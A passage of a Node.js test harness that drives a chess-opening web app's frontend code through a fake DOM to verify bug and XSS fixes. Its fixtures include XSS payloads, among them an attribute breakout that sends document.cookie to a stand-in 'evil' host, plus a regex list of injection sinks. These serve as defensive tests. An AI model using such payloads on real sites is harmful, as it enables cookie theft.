#!/usr/bin/env node
/**
 * FIXER-G-01 — frontend contract harness (CODE-4 findings owned by FIXER-G).
 *
 * Loads the REAL `frontend/scout.js`, `frontend/repertoire_trainer.js`,
 * `frontend/app.js` and `frontend/audio.js` sources into a sandbox with a tiny
 * fake DOM + a scriptable `fetch`, and drives the production functions. Nothing
 * is re-implemented here: every assertion runs against the shipped code.
 *
 * Usage:
 *   node audit/scripts/FIXER-G-01_contracts.js                     # current tree
 *   node audit/scripts/FIXER-G-01_contracts.js --source <scout.js>  # any revision
 *        --trainer <file> --app <file> --audio <file>
 *   node audit/scripts/FIXER-G-01_contracts.js --list               # only list tests
 *
 * Exit code 0 = every check passed. Prints one line per check:
 *   [PASS] id  description
 *   [FAIL] id  description  ->  detail
 * Idempotent, read-only: no database, no network, no port 38281.
 */
'use strict';

const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '..', '..');
const argv = process.argv.slice(2);
function arg(name, dflt) {
    const i = argv.indexOf(name);
    return (i >= 0 && argv[i + 1]) ? argv[i + 1] : dflt;
}
const SRC = {
    scout: arg('--source', path.join(ROOT, 'frontend', 'scout.js')),
    trainer: arg('--trainer', path.join(ROOT, 'frontend', 'repertoire_trainer.js')),
    app: arg('--app', path.join(ROOT, 'frontend', 'app.js')),
    audio: arg('--audio', path.join(ROOT, 'frontend', 'audio.js')),
    // Read-only: the LAYOUT-01 checks assert the shipped stylesheet, and a
    // missing/empty style.css must FAIL those checks rather than skip them.
    style: path.join(ROOT, 'frontend', 'style.css')
};
const LIST_ONLY = argv.includes('--list');

/* ------------------------------------------------------------------ utils */
const results = [];
function check(id, ok, desc, detail) {
    results.push({ id, ok: !!ok, desc, detail });
    if (!LIST_ONLY) {
        console.log(`  [${ok ? 'PASS' : 'FAIL'}] ${id}  ${desc}${ok ? '' : '  ->  ' + detail}`);
    }
}
/**
 * Runs one check section. A source that predates the fix may not even have the
 * method under test, so a throw is recorded as a FAIL instead of aborting the
 * whole run (that is what makes the pre-fix run informative).
 */
async function section(name, fn) {
    if (typeof fn !== 'function') { if (!LIST_ONLY) console.log(`\n=== ${name}`); return; }
    if (!LIST_ONLY) console.log(`\n=== ${name}`);
    try {
        await fn();
    } catch (e) {
        check(`${name.split(' ')[0]}::crash`, false, `${name} (threw against this source)`,
            e && e.message ? e.message : String(e));
    }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** Any executable / injection sink must be absent from produced markup. */
const SINKS = [
    /<\s*script/i,
    /<\s*img[^>]*\bon(error|load|click|mouseover)\s*=/i,
    /\son(error|load|click|mouseover|focus|blur)\s*=\s*["']/i,
    /javascript\s*:/i,
    /<\s*svg/i,
    /<\s*iframe[^>]*srcdoc/i
];
function activeSinks(markup) {
    return SINKS.filter((re) => re.test(markup)).map((re) => String(re));
}

/* --------------------------------------------------------------- fake DOM */
class FakeClassList {
    constructor() { this._set = new Set(); }
    add(...c) { c.forEach(x => this._set.add(x)); }
    remove(...c) { c.forEach(x => this._set.delete(x)); }
    contains(c) { return this._set.has(c); }
    toggle(c, force) { const on = force === undefined ? !this._set.has(c) : !!force; if (on) this._set.add(c); else this._set.delete(c); return on; }
    get value() { return [...this._set].join(' '); }
}
class FakeEl {
    constructor(tag = 'div', id = '') {
        this.tagName = String(tag).toUpperCase();
        this.id = id;
        this.style = {};
        this.dataset = {};
        this.classList = new FakeClassList();
        this.children = [];
        this.attrs = {};
        this._innerHTML = '';
        this._textContent = '';
        this.listeners = {};
        this._options = [];
        this.value = '';
        this.disabled = false;
        this.title = '';
        this.className = '';
    }
    set innerHTML(v) { this._innerHTML = v === null || v === undefined ? '' : String(v); }
    get innerHTML() { return this._innerHTML; }
    set textContent(v) { this._textContent = v === null || v === undefined ? '' : String(v); }
    get textContent() { return this._textContent; }
    setAttribute(k, v) { this.attrs[k] = String(v); if (k.startsWith('data-')) this.dataset[k.slice(5).replace(/-([a-z])/g, (m, c) => c.toUpperCase())] = String(v); }
    getAttribute(k) { return (k in this.attrs) ? this.attrs[k] : null; }
    appendChild(child) { this.children.push(child); return child; }
    removeChild(child) { this.children = this.children.filter((c) => c !== child); return child; }
    addEventListener(type, fn) { (this.listeners[type] = this.listeners[type] || []).push(fn); }
    removeEventListener() {}
    dispatch(type, evt) { (this.listeners[type] || []).forEach((fn) => fn(evt || { preventDefault() {}, stopPropagation() {} })); }
    set className(v) { this._className = v; this.classList = new FakeClassList(); String(v).split(/\s+/).filter(Boolean).forEach((c) => this.classList.add(c)); }
    get className() { return this._className || ''; }
    querySelector() { return null; }
    querySelectorAll() { return []; }
    getBoundingClientRect() { return { top: 0, left: 0, height: 10, width: 10 }; }
    focus() {} select() {} scrollIntoView() {} click() {} setSelectionRange() {}
    closest() { return null; }
    insertBefore(node) { this.children.push(node); return node; }
    nextSibling = null;
    get options() { return this.children; }
    set options(v) { this._options = v; }
}
class FakeDocument {
    constructor() {
        this.elements = new Map();
        this.body = new FakeEl('body');
        this.activeElement = null;
        this.windowListeners = {};
        this.confirmResult = true;
        this.confirmCalls = [];
    }
    createElement(tag) { return new FakeEl(tag); }
    createTextNode(t) { const el = new FakeEl('#text'); el.textContent = t; return el; }
    getElementById(id) {
        if (!this.elements.has(id)) this.elements.set(id, new FakeEl('div', id));
        return this.elements.get(id);
    }
    /** ids the source asked for, in order (for dead-selector checks) */
    requestedIds() { return [...this.elements.keys()]; }
    querySelectorAll() { return []; }
    querySelector() { return null; }
    addEventListener() {}
    removeEventListener() {}
}

/* -------------------------------------------------------- script sandbox */
function loadScout(doc, win) {
    const src = fs.readFileSync(SRC.scout, 'utf8');
    const factory = new Function(
        'window', 'document', 'fetch', 'confirm', 'prompt', 'alert', 'setTimeout', 'clearTimeout', 'setInterval', 'clearInterval', 'requestAnimationFrame', 'AbortController', 'InteractiveChessboard',
        `${src}\n;return { OpeningScout, SessionLineTree, SessionTreeNode };`
    );
    return factory(
        win, doc, win.fetch, (...a) => { doc.confirmCalls.push(a); return doc.confirmResult; },
        () => null, () => {}, win.setTimeout, win.clearTimeout, win.setInterval, win.clearInterval,
        win.requestAnimationFrame, win.AbortController, function InteractiveChessboard() {}
    );
}
function loadTrainer(doc, win) {
    const src = fs.readFileSync(SRC.trainer, 'utf8');
    const factory = new Function(
        'window', 'document', 'fetch', 'setTimeout', 'clearTimeout', 'setInterval', 'clearInterval', 'AbortController', 'InteractiveChessboard',
        `${src}\n;return { RepertoireTrainer };`
    );
    return factory(win, doc, win.fetch, win.setTimeout, win.clearTimeout, win.setInterval, win.clearInterval, win.AbortController, function InteractiveChessboard() {});
}
function loadApp(doc, win) {
    const src = fs.readFileSync(SRC.app, 'utf8');
    const factory = new Function(
        'window', 'document', 'fetch', 'setTimeout', 'clearTimeout', 'requestAnimationFrame',
        `${src}\n;return { ChessApp, promptStudySelection: window.promptStudySelection };`
    );
    return factory(win, doc, win.fetch, win.setTimeout, win.clearTimeout, win.requestAnimationFrame);
}
function loadAudio(win) {
    const src = fs.readFileSync(SRC.audio, 'utf8');
    const factory = new Function('window', `${src}\n;return { ChessAudio: window.chessAudio };`);
    return factory(win);
}

/** Sandbox environment: fake DOM + real timers + abortable fake fetch. */
function makeEnv(overrides = {}) {
    const doc = new FakeDocument();
    const timers = [];
    const win = {
        AudioContext: undefined,
        fetch: null,
        setTimeout: (fn, ms) => { const t = setTimeout(fn, ms); timers.push(t); return t; },
        clearTimeout: (t) => { clearTimeout(t); },
        setInterval: (fn, ms) => { const t = setInterval(fn, ms); timers.push(t); return t; },
        clearInterval: (t) => { clearInterval(t); },
        requestAnimationFrame: (fn) => setTimeout(fn, 0),
        addEventListener(type, fn) { (this._l = this._l || {})[type] = (this._l[type] || []).concat(fn); },
        removeEventListener() {},
        dispatch(type, evt) { ((this._l || {})[type] || []).forEach((fn) => fn(evt)); }
    };
    win.window = win;
    win.document = doc;
    win.confirm = (...a) => { doc.confirmCalls.push(a); return doc.confirmResult; };
    win.prompt = () => null;
    win.alert = () => {};
    win.AbortController = class { constructor() { this.signal = { aborted: false }; } abort() { this.signal.aborted = true; } };

    // Scriptable fetch: routes are matched by "METHOD /path" prefix.
    const calls = [];
    const routes = Object.assign({}, overrides.routes || {});
    win.fetch = (url, init = {}) => {
        const method = (init.method || 'GET').toUpperCase();
        const pathOnly = String(url).split('?')[0];
        calls.push({ url: String(url), path: pathOnly, method, init, body: init.body ? safeParse(init.body) : null });
        if (init.signal && init.signal.aborted) {
            const err = new Error('Aborted');
            err.name = 'AbortError';
            return Promise.reject(err);
        }
        const key = `${method} ${pathOnly}`;
        const route = routes[key] || routes[pathOnly] || routes['*'];
        if (route === undefined) {
            return Promise.resolve(jsonResponse(404, { detail: 'no route' }));
        }
        const value = (typeof route === 'function') ? route(calls[calls.length - 1]) : route;
        if (value && value.__promise) return value.__promise;
        if (value && value.__deferred) return value.__deferred.promise;
        return Promise.resolve(jsonResponse((value && value.status) || 200, (value && 'body' in value) ? value.body : value));
    };
    return { doc, win, calls, routes, dispose: () => timers.forEach((t) => { clearTimeout(t); clearInterval(t); }) };
}
function jsonResponse(status, body) {
    return {
        ok: status >= 200 && status < 300,
        status,
        statusText: '',
        json: () => Promise.resolve(body),
        text: () => Promise.resolve(JSON.stringify(body)),
        body: null
    };
}
function deferred() {
    let resolve;
    const promise = new Promise((r) => { resolve = r; });
    return { promise, resolve };
}
function safeParse(s) { try { return JSON.parse(s); } catch (_) { return null; } }

/** Strips JS comments so static checks only look at executable code. */
function stripJsComments(src) {
    return src
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .split('\n')
        .map((line) => {
            const inStr = /'[^']*'|"[^"]*"|`[^`]*`/.test(line);
            const idx = line.indexOf('//');
            if (idx === -1) return line;
            if (inStr && !/^\s*\/\//.test(line)) {
                // only strip when the // is clearly outside a string
                const before = line.slice(0, idx);
                const quotes = (before.match(/'/g) || []).length + (before.match(/"/g) || []).length;
                if (quotes % 2 === 1) return line;
            }
            return line.slice(0, idx);
        })
        .join('\n');
}

/* ------------------------------------------------------------- fixtures */
const START = 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq -';
const START4 = START;
const FEN_AFTER_E4 = 'rnbqkbnr/pppppppp/8/8/4P3/8/PPPP1PPP/RNBQKBNR b KQkq -';
const FEN_AFTER_E4_E5 = 'rnbqkbnr/pppp1ppp/8/4p3/4P3/8/PPPP1PPP/RNBQKBNR w KQkq -';
const HOSTILE = '<img src=x onerror=alert(1)>"><svg onload=alert(2)>';
const HOSTILE_ATTR = '" onmouseover="fetch(\'//evil/\'+document.cookie)';
const MOVES = {
    e4: { fen_before: START4, fen_after: FEN_AFTER_E4, uci: 'e2e4', san: 'e4', color: 'white', move_number: 1 },
    e5: { fen_before: FEN_AFTER_E4, fen_after: FEN_AFTER_E4_E5, uci: 'e7e5', san: 'e5', color: 'black', move_number: 1 }
};
function fakeScout(env, exports) {
    // Bypass the constructor's _init() (network + board); keep the real methods.
    const s = Object.create(exports.OpeningScout.prototype);
    s.board = null;
    s.activeStudy = null;
    s.lineTree = new exports.SessionLineTree();
    s.ytPlayer = null; s.ytPlayerReady = false; s.ytVideoId = null; s.ytPendingVideoId = null;
    s.ytApiRetryTimer = null; s.ytSyncTimer = null;
    s.evalAbortController = null;
    s.orientation = 'white';
    s.activeFilter = 'all';
    s.cachedResults = [];
    s.lastBoardFen = START4;
    s.treeOverlapMap = { white: {}, black: {} };
    s.activeOverlapDebounce = null;
    s.currentStudy = '';
    s.studiesList = [];
    s.searchSeq = 0; s.analyzeSeq = 0; s.activeOverlapSeq = 0; s.treeOverlapSeq = 0;
    s.activeOverlapController = null; s.treeOverlapController = null;
    s.searchController = null; s.activeLineOverlap = null; s._treeOverlapSnapshot = '';
    s._lastSyncedUci = null;
    s.lastActionRepertoire = 'white';
    s.moveTimestamps = {}; s._videoSyncGuard = false;
    // Discovery state. `renderResults()` is total without these (it re-initialises
    // them), but leaving them undefined here would mean the harness never
    // exercised the grouped / bucketed render path with a real intent.
    s.intentSide = ''; s.intentMode = ''; s.intent = null;
    s.intentReplies = []; s.chosenEco = ''; s.ecoGuides = [];
    s.needsEnrichment = []; s.enrichSeq = 0; s.sortMode = 'match';
    s.scheduleOverlapCheck = () => {};        // no timers in the harness
    s.streamEvaluation = () => {};
    s.loadStudies = async () => {};
    return s;
}

/* =========================================================== the checks */
async function run() {
    /* ------------------------------------------------ SEC-01 (results grid) */
    await section('SEC-01 — unescaped YouTube title/channel/thumbnail in the results grid', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.repertoireBuilder = null;
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.cachedResults = [
            { id: 'vid1', source_type: 'youtube', title: HOSTILE, channel: HOSTILE_ATTR, eco: HOSTILE, duration_formatted: '10m', thumbnail: 'javascript:alert(3)' },
            { id: 'g2', source_type: 'eco_guide', title: 'Safe ' + HOSTILE, channel: 'Chess Guide', eco: 'B20', thumbnail: 'https://i.ytimg.com/x.jpg' }
        ];
        s.renderResults();
        const html = env.doc.getElementById('scoutResultsGrid').innerHTML;
        check('SEC-01.a', html.length > 0, 'renderResults() produced markup', 'empty output');
        check('SEC-01.b', activeSinks(html).length === 0,
            'no <script>/event-handler/svg/javascript: sink survives in the card grid',
            `sinks=${JSON.stringify(activeSinks(html))} markup=${html.slice(0, 400)}`);
        check('SEC-01.c', /&lt;img src&#61;x onerror&#61;alert\(1\)&gt;/.test(html),
            'the hostile title is HTML-escaped in the output', html.slice(0, 300));
        check('SEC-01.d', !/onerror=/.test(html) && !/onerror=/.test(fs.readFileSync(SRC.scout, 'utf8').split('renderResults')[1] || ''),
            'the inline onerror= attribute is gone from the card template', 'onerror still present');
        check('SEC-01.e', /src="\/assets\/pieces\/wN\.svg"/.test(html),
            'a javascript: thumbnail URL is replaced by the local fallback', html.slice(0, 300));

        // LAYOUT-01: `#scoutResultsGrid` is itself a multi-column grid, and
        // renderResults() stacks *sections* inside it (group title + a nested
        // grid per bucket). Those sections must span every column: as ordinary
        // grid items they were laid out side by side, so each nested grid came
        // out one auto-filled column wide and rendered a single card per row
        // down a narrow column with the rest of the viewport empty.
        const cssText = fs.readFileSync(SRC.style, 'utf8');
        check('LAYOUT-01.a', /#scoutResultsGrid\s*>\s*\*\s*\{[^}]*grid-column:\s*1\s*\/\s*-1/.test(cssText),
            'every direct child of the results grid spans all columns',
            cssText.match(/#scoutResultsGrid[^}]*\}/) ? cssText.match(/#scoutResultsGrid[^}]*\}/)[0] : 'rule not found');
        check('LAYOUT-01.b', /#scoutResultsGrid\s*>\s*\*/.test(cssText),
            'the span rule is a child selector, so a new section inherits it',
            'the rule would have to be re-declared per section otherwise');
        // The shim keeps `innerHTML` as a string (it does not parse a DOM), so the
        // structure is asserted from the markup rather than from `children` --
        // a `children`-based check here would pass vacuously on an empty array.
        // The *source* structure is pinned in tests/test_layout_contracts.py.
        const nestedGrids = html.match(/scout-cards-grid--nested/g) || [];
        const cards = html.match(/class="card-panel scout-card"/g) || [];
        check('LAYOUT-01.c', nestedGrids.length > 0 && cards.length > 0,
            'the results are rendered inside a nested per-section grid',
            `nested=${nestedGrids.length} cards=${cards.length}`);
        env.dispose();
    });

    /* ------------------------------------------------ SEC-02 (line cards) */
    await section('SEC-02 — line name / study name / server message into innerHTML', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.repertoireBuilder = null;
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.lineTree.addMove({ ...MOVES.e4, opening_name: HOSTILE, eco: HOSTILE });
        s.lineTree.addMove({ ...MOVES.e5, opening_name: HOSTILE });
        s.currentStudy = 'x' + HOSTILE_ATTR;                       // study name (stored, unvalidated)
        s.lineTree.currentNode.studyName = 'study' + HOSTILE;
        s.treeOverlapMap = {
            white: { [s.lineTree.getAllLines()[0].lineId]: { status: 'partially_present', matched_plies: 1, total_plies: 2, new_plies: 1, message: HOSTILE + HOSTILE_ATTR, divergence_info: { type: 'user_move_alternative', ply: 1, new_san: HOSTILE, existing_san: 'Nf3' } } },
            black: {}
        };
        s.renderTreeLines();
        const html = env.doc.getElementById('scoutVariationsList').innerHTML;
        check('SEC-02.a', html.length > 0, 'renderTreeLines() produced markup', 'empty output');
        check('SEC-02.b', activeSinks(html).length === 0,
            'no <script>/event-handler/svg/javascript: sink survives in a line card',
            `sinks=${JSON.stringify(activeSinks(html))} markup=${html.slice(0, 400)}`);
        check('SEC-02.c', !/\son[a-z]+="/i.test(html.replace(/&quot;/g, '"')),
            'no attribute break-out in the line card', html.slice(0, 400));
        env.dispose();
    });

    /* ------------------------------------------ CODE-01 (orientation bug) */
    await section('CODE-01 — the repertoire key must come from the LINE, never from the board flip', async () => {
        for (const orientation of ['white', 'black']) {
            const env = makeEnv({ routes: { 'POST /api/repertoire/move_meta': { status: 200, body: { status: 'success', move: { repertoire: 'white' } } } } });
            const exports = loadScout(env.doc, env.win);
            env.win.repertoireBuilder = null;
            env.win.showToast = () => {};
            const s = fakeScout(env, exports);
            s.orientation = orientation;
            s.lineTree.addMove(MOVES.e4);            // a WHITE move
            await s.saveMoveNote('flip test note');
            const call = env.calls.find((c) => c.path === '/api/repertoire/move_meta');
            check(`CODE-01.a[orientation=${orientation}]`, call && call.body.repertoire === 'white',
                'saveMoveNote() targets the White repertoire for a White move',
                call ? JSON.stringify(call.body) : 'no request was made');
        }
        // ... and the converse: a Black move must target Black, whatever the flip.
        for (const orientation of ['white', 'black']) {
            const env = makeEnv({ routes: { 'POST /api/repertoire/move_meta': { status: 200, body: { status: 'success', move: { repertoire: 'black' } } } } });
            const exports = loadScout(env.doc, env.win);
            env.win.repertoireBuilder = null;
            env.win.showToast = () => {};
            const s = fakeScout(env, exports);
            s.orientation = orientation;
            s.lineTree.addMove(MOVES.e4);
            s.lineTree.addMove(MOVES.e5);            // a BLACK move
            await s.saveMoveNote('flip test note 2');
            const call = env.calls.find((c) => c.path === '/api/repertoire/move_meta');
            check(`CODE-01.b[orientation=${orientation}]`, call && call.body.repertoire === 'black',
                'saveMoveNote() targets the Black repertoire for a Black move',
                call ? JSON.stringify(call.body) : 'no request was made');
        }
        // Static proof for the other write/read sites: no *executable* line may
        // read `this.orientation` any more (comments are ignored).
        const src = fs.readFileSync(SRC.scout, 'utf8');
        const codeReads = src.split('\n')
            .map((l, i) => [i + 1, l])
            .filter(([, l]) => l.includes('this.orientation'))
            .filter(([, l]) => !/^\s*(\*|\/\/)/.test(l))
            .map(([n, l]) => `${n}: ${l.trim()}`);
        check('CODE-01.c', codeReads.length <= 5,
            'this.orientation is only read for cosmetic purposes (board flip + eval bar mirror)',
            `${codeReads.length} executable reads:\n  ${codeReads.join('\n  ')}`);
    });

    /* ------------------------------------------------- CODE-02 (deleteLine) */
    await section('CODE-02 — deleteLine() must not orphan currentNode', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        const t = new exports.SessionLineTree();
        t.addMove(MOVES.e4);
        const leaf = t.addMove(MOVES.e5);
        t.currentNode = leaf.parent;                 // user stepped back to 1.e4
        t.deleteLine(leaf);
        t.addMove({ fen_before: START4, fen_after: FEN_AFTER_E4, uci: 'd2d4', san: 'd4', color: 'white', move_number: 1 });
        const lines = t.getAllLines();
        check('CODE-02.a', lines.length === 1 && lines[0].moves[0].uci === 'd2d4',
            'the move played after a delete stays in the session tree',
            JSON.stringify(lines.map((l) => l.moves.map((m) => m.uci))));
        check('CODE-02.b', typeof t.isAttached === 'function' ? t.isAttached(t.currentNode) : false,
            'currentNode is still attached to the root after deleteLine', 'detached / helper missing');
        env.dispose();
    });

    /* ---------------------------------------------------- CODE-03 (_buildPgn) */
    await section('CODE-03 — _buildPgn() for a black-first line', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        const t = new exports.SessionLineTree();
        t.addMove({ fen_before: START4, fen_after: FEN_AFTER_E4, uci: 'e7e5', san: 'e5', color: 'black', move_number: 1 });
        t.addMove({ fen_before: FEN_AFTER_E4, fen_after: FEN_AFTER_E4_E5, uci: 'd2d4', san: 'd4', color: 'white', move_number: 2 });
        const pgn = t.getAllLines()[0].pgn;
        check('CODE-03.a', pgn === '1... e5 2. d4', 'black-first line emits valid PGN', JSON.stringify(pgn));
        const t2 = new exports.SessionLineTree();
        t2.addMove(MOVES.e4);
        t2.addMove(MOVES.e5);
        t2.addMove({ fen_before: FEN_AFTER_E4_E5, fen_after: FEN_AFTER_E4_E5, uci: 'g1f3', san: 'Nf3', color: 'white', move_number: 2 });
        const pgn2 = t2.getAllLines()[0].pgn;
        check('CODE-03.b', pgn2 === '1. e4 e5 2. Nf3', 'white-first line is unchanged', JSON.stringify(pgn2));
        env.dispose();
    });

    /* ------------------------------------------- CODE-05 (stale responses) */
    await section('CODE-05 — stale search() responses must not overwrite newer ones', async () => {
        const slow = deferred();
        const fast = deferred();
        const env = makeEnv({
            routes: {
                'GET /api/scout/discover': (call) => (call.url.includes('SLOW') ? { __deferred: slow } : { __deferred: fast })
            }
        });
        const exports = loadScout(env.doc, env.win);
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        const discover = (id, title) => ({
            intent: { query: title, side: null, mode: 'either', needs_disambiguation: false,
                      candidates: [], primary: null, families: [], reasons: [] },
            queries: [title], results: [{ id, source_type: 'youtube', title, bucket: 'course' }],
            groups: { exact: [], related: [], course: [{ id, source_type: 'youtube', title, bucket: 'course' }] },
            needs_enrichment: [], eco_guides: [], replies: [], awaiting_choice: false
        });
        const p1 = s.search('SLOW-opening');
        const p2 = s.search('fast-opening');
        fast.resolve(jsonResponse(200, discover('b', 'FAST result')));
        await p2;
        slow.resolve(jsonResponse(200, discover('a', 'SLOW result')));
        await p1;
        const html = env.doc.getElementById('scoutResultsGrid').innerHTML;
        check('CODE-05.a', /FAST result/.test(html) && !/SLOW result/.test(html),
            'the newer search result is what stays on screen', html.slice(0, 200));
        env.dispose();
    });
    {
        // analyzeSource: two quick clicks, the slower one must lose.
        const slow = deferred();
        const fast = deferred();
        const env = makeEnv({
            routes: { 'POST /api/scout/analyze': (call) => (call.body.source.includes('slow') ? { __deferred: slow } : { __deferred: fast }) }
        });
        const exports = loadScout(env.doc, env.win);
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.openStudio = (study) => { s.opened = study.title; };
        const p1 = s.analyzeSource('slow-video');
        const p2 = s.analyzeSource('fast-video');
        fast.resolve(jsonResponse(200, { title: 'FAST' }));
        await p2;
        slow.resolve(jsonResponse(200, { title: 'SLOW' }));
        await p1;
        check('CODE-05.b', s.opened === 'FAST', 'only the newest analysis opens the studio', String(s.opened));
        env.dispose();
    }

    /* -------------------------------------------- CODE-06 (badge identity) */
    await section('CODE-06 — overlap badges keyed by line identity, not array position', async () => {
        const env = makeEnv();
        const exports = loadScout(env.doc, env.win);
        env.win.repertoireBuilder = null;
        env.win.showToast = () => {};
        const s = fakeScout(env, exports);
        s.lineTree.addMove(MOVES.e4);
        s.lineTree.addMove(MOVES.e5);
        s.lineTree.currentNode = s.lineTree.root.children[0];
        s.lineTree.addMove({ fen_before: FEN_AFTER_E4_E5, fen_after: FEN_AFTER_E4_E5, uci: 'd2d4', san: 'd4', color: 'white', move_number: 2 });
        const firstLineId = s.lineTree.getAllLines()[0].lineId;
        // Two lines now; the badge map was computed BEFORE the second line existed.
        s.treeOverlapMap = { white: { [firstLineId]: { status: 'already_present', matched_plies: 2, total_plies: 2, message: 'present' } }, black: {} };
        s.renderTreeLines();
        const html = env.doc.getElementById('scoutVariationsList').innerHTML;
        const cards = html.split('<div class="scout-var-card').slice(1);
        const badgeOf = (card) => {
            const start = card.indexOf('scout-card-overlap-badges');
            const end = card.indexOf('scout-line-study-row');
            return (start === -1) ? '' : card.slice(start, end === -1 ? undefined : end);
        };
        const badgeOrder = cards.map((c) => (badgeOf(c).includes('✓ In White') ? 'present' : 'new'));
        check('CODE-06.a', cards.length === 2, 'two line cards rendered', `cards=${cards.length}`);
        check('CODE-06.b', badgeOrder[0] === 'present' && badgeOrder[1] === 'new',
            'the already-present badge stayed on its own line after a new line was added',
            JSON.stringify(badgeOrder) + ' :: ' + JSON.stringify(cards.map(badgeOf)));
        // The payload must carry the node id, not the array index.
        let payload = null;
        const env2 = makeEnv({ routes: { 'POST /api/scout/check_tree': (call) => { payload = call.body.lines.map((l) => l.id); return { status: 200, body: [] }; } } });
        const exports2 = loadScout(env2.doc, env2.win);
        env2.win.showToast = () => {};
        const s2 = fakeScout(env2, exports2);
        s2.lineTree.addMove(MOVES.e4);
        await s2.checkTreeOverlap();
        const ids = (payload || []).map((id) => String(id));
        check('CODE-06.c', ids.length === 1 && ids[0] === s2.lineTree.getAllLines()[0].lineId,
            'check_tree() is keyed by the leaf node id', JSON.stringify(ids));
        env.dispose(); env2.dispose();
    });

    /* ------------------------------------------- CODE-07 (trainer timers) */
    await section('CODE-07 — uncleared 550ms/800ms timers must not touch the next drill', async () => {
        const env = makeEnv();
        const exports = loadTrainer(env.doc, env.win);
        env.win.showToast = () => {};
        env.win.chessAudio = { playSuccess() {}, playBlunder() {}, playMove() {} };
        const t = new exports.RepertoireTrainer();
        const boardCalls = [];
        t.board = {
            loadFEN: (fen) => boardCalls.push(['loadFEN', fen]),
            clearArrows() { boardCalls.push(['clearArrows']); },
            setArrows() {}, setLastMove() {}, addArrow() {}, render() {},
            getFEN: () => START, playMove: (f, tt) => boardCalls.push(['playMove', f, tt]),
            setOrientation() {}, options: {}
        };
        t.isInitialized = true;   // skip DOM init
        t.currentFen = START4;
        t.currentDrill = { expected_uci: 'e2e4', last_move: { from: 'e2', to: 'e4' } };
        t.isWaitingForUser = true;
        env.routes['POST /api/repertoire/train/attempt'] = {
            status: 200,
            body: {
                correct: true, message: 'ok', prepared_id: 1,
                opponent_reply: { uci: 'e7e5', san: 'e5' },
                next_expected_uci: 'd2d4', next_expected_san: 'd4', is_line_end: false,
                study_name: 'S', next_opening_name: 'O', your_san: 'e4'
            }
        };
        const p = t.onUserAttempt('e2', 'e4', null, { san: 'e4' });
        // Replace the drill (as "New Position" / colour switch does) immediately.
        t.drillToken = (t.drillToken || 0) + 1;
        if (typeof t._clearDrillTimers === 'function') t._clearDrillTimers();
        t.currentFen = 'rnbqkbnr/pppppppp/8/8/3P4/8/PPP1PPPP/RNBQKBNR b KQkq - 0 1';
        await p;
        await sleep(700);
        check('CODE-07.a', !boardCalls.some((c) => c[0] === 'playMove'),
            'the stale 550ms opponent reply does not play on the new drill', JSON.stringify(boardCalls));
        check('CODE-07.b', t.currentFen.endsWith('3P4/8/PPP1PPPP/RNBQKBNR b KQkq - 0 1'),
            'the new drill FEN is not overwritten by the stale callback', t.currentFen);
        // And the mistake-reset timer.
        const boardCalls2 = [];
        t.board.loadFEN = (fen) => boardCalls2.push(fen);
        t.drillToken++;
        env.routes['POST /api/repertoire/train/attempt'] = { status: 200, body: { correct: false, message: 'wrong', expected_uci: 'e2e4' } };
        const p2 = t.onUserAttempt('d2', 'd4', null, { san: 'd4' });
        t.drillToken = (t.drillToken || 0) + 1;   // new drill starts while the 800ms reset is queued
        t.currentFen = 'AFTER-NEW-DRILL';
        await p2;
        await sleep(950);
        check('CODE-07.c', !boardCalls2.includes('AFTER-NEW-DRILL') || boardCalls2.length === 0,
            'the stale 800ms mistake reset does not reload the new drill FEN', JSON.stringify(boardCalls2));
        env.dispose();
    });

    /* --------------------------------------- CODE-08 (saveSettings res.ok) */
    await section('CODE-08 — saveSettings() must not claim success on a failure', async () => {
        for (const [label, route] of [
            ['400', { status: 400, body: { detail: 'Invalid Lichess token' } }],
            ['500-html', { status: 500, body: {} }]
        ]) {
            const env = makeEnv({ routes: { 'POST /api/settings': route } });
            const toasts = [];
            const appMod = loadApp(env.doc, env.win);
            // app.js installs its own window.showToast; spy on it *after* load.
            env.win.showToast = (msg, color) => toasts.push({ msg, color });
            const app = new appMod.ChessApp();
            app._bindUI = () => {};
            app.loadAccount = async () => {};
            await app.saveSettings();
            const successToast = toasts.find((t) => /successfully/i.test(t.msg));
            check(`CODE-08.a[${label}]`, !successToast,
                `no success toast when the server answers ${label}`,
                JSON.stringify(toasts));
            check(`CODE-08.b[${label}]`, toasts.some((t) => /NOT saved/i.test(t.msg)),
                `a failure toast names the problem (${label})`, JSON.stringify(toasts));
            env.dispose();
        }
        // Happy path still clears the raw token out of the DOM.
        const env = makeEnv({ routes: { 'POST /api/settings': { status: 200, body: { ok: true } }, 'GET /api/account': { status: 200, body: {} } } });
        const toasts = [];
        const appMod = loadApp(env.doc, env.win);
        env.win.showToast = (msg) => toasts.push(msg);
        const app = new appMod.ChessApp();
        app._bindUI = () => {};
        app.loadAccount = async () => {};
        env.doc.getElementById('inputToken').value = 'lip_SECRET';
        await app.saveSettings();
        check('CODE-08.c', env.doc.getElementById('inputToken').value === '',
            'the raw Lichess token is cleared from the input after a successful save',
            env.doc.getElementById('inputToken').value);
        env.dispose();
    });

    /* ------------------------------------------- CODE-09 (delete reporting) */
    await section('CODE-09 — a delete that removed nothing must not report success', async () => {
        // (a) server now reports deleted_count (post-hand-off behaviour)
        const env = makeEnv({
            routes: {
                'DELETE /api/repertoire/move': { status: 200, body: { status: 'ok', deleted_count: 0 } },
                'POST /api/scout/check_line': { status: 200, body: { status: 'new' } }
            }
        });
        const toasts = [];
        env.win.showToast = (msg, color) => toasts.push({ msg, color });
        env.win.chessAudio = { playSuccess() { toasts.push({ msg: 'AUDIO_SUCCESS' }); }, playRemove() {}, playCapture() {} };
        env.win.repertoireBuilder = { loadRepertoire() {} };
        env.doc.confirmResult = true;
        const exports = loadScout(env.doc, env.win);
        const s = fakeScout(env, exports);
        s.orientation = 'black';                     // board flipped
        s.lineTree.addMove(MOVES.e4);
